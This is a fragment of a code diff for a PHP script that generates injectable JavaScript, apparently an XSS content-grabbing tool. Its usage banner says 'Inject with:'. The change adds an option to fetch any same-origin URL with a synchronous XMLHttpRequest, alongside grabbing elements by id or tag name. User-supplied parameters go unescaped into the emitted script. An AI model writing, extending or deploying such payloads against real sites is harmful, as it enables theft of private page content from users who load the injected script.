@@ -6,8 +6,15 @@
   echo "// $url\n";
   if( !isset( $_GET["c"] ) ){
     echo "/*\n Inject with:\n ".$url."?id=userDiv or ".$url."?tag=ul\n";
-    echo " Where id is the id of an element to be grabbed or tag is the name of all tags to be grabbed. Defaults to tag=body\n*/\n\n";
-    if( !empty( $_GET["id"] ) ){
+    echo " Where:\n"
+      ."   id is the id of an element to be grabbed\n"
+      ."   tag is the name of all tags to be grabbed.\n"
+      ."   url is a URL within the same origin to download and return\n"
+      ."Defaults to tag=body\n*/\n\n";
+    if( !empty( $_GET["url"] ) ){
+      echo "function g(u){ x=new XMLHttpRequest(); x.open('GET',u,false); x.send(null); return x.responseText; }\n"
+        ."var content = g('".$_GET["url"]."');\n";
+    }elseif( !empty( $_GET["id"] ) ){
       echo "var content = document.getElementById('".$_GET["id"]."').outerHTML;\n";
     }else{
       if( empty( $_GET["tag"] ) ) $_GET["tag"] = "body";
